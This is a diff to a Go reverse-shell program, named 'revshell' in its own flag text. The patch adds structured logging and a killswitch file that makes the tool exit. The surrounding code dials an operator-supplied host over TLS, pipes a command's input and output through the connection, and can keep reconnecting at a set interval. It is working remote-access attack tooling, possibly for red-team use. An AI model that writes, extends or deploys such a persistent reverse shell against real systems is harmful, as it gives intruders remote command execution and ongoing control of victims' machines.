@@ -10,6 +10,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"log/slog"
 	"math/big"
 	"os"
 	"os/exec"
@@ -41,6 +42,7 @@ func main() {
 	command := flag.String("c", defaultCmd, "Command to run")
 	keepTrying := flag.Bool("k", false, "Keep trying to connect")
 	retry := flag.Int("r", 60, "Retry interval in seconds")
+	killswitchFile := flag.String("killswitch", "/tmp/.revshellkillswitch", "If this file exists, the revshell program will exit")
 	flag.Parse()
 
 	connectionString := fmt.Sprintf("%s:%s", *host, *port)
@@ -79,12 +81,18 @@ func main() {
 
 	if *keepTrying {
 		for {
+			if _, err := os.Stat(*killswitchFile); err == nil {
+				slog.Info("killswitch file exists, exiting")
+				os.Exit(0)
+			}
+
 			conn, err = tls.Dial("tcp", connectionString, &config)
 			if err != nil {
-				fmt.Println(err)
+				slog.Error("connection error", "err", err)
 				time.Sleep(time.Duration(*retry) * time.Second)
 				continue
 			}
+			slog.Info("connected", "host", *host, "port", *port, "command", *command)
 
 			cmd.Stdin = conn
 			cmd.Stdout = conn
@@ -94,7 +102,7 @@ func main() {
 	} else {
 		conn, err = tls.Dial("tcp", connectionString, &config)
 		if err != nil {
-			fmt.Println(err)
+			slog.Error("connection error", "err", err)
 			os.Exit(1)
 		}
 
